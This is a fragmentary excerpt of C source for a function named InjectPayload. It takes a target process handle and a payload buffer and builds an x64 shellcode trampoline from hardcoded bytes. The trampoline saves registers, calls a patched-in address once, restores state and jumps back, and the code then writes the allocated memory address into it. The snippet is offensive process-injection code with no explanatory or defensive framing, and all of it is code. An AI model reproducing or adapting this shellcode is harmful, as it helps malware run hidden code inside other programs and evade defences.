...
BOOL InjectPayload(HANDLE hProcess, unsigned char* buffer, int bufferlen)
{
    ...
    #define NEWPAYLOAD
    #ifdef NEWPAYLOAD
    BYTE shellcodeTemplate[jumper_size] = { 0x50, 0x53, 0x51, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xA1, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x75, 0x34, 0x48, 0xFF, 0xC0, 0x48, 0xA3, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0xB8, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x31, 0xC9, 0x48, 0x31, 0xD2, 0x49, 0xB8, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0x4D, 0x31, 0xC9, 0x41, 0x51, 0x41, 0x51, 0xFF, 0xD0, 0x41, 0x59, 0x41, 0x59, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x59, 0x5B, 0x58, 0x41, 0xFF, 0xE2 } ;
    ...
    *((DWORD64 *)(&(shellcodeTemplate[0x37]))) = (DWORD64) mem;
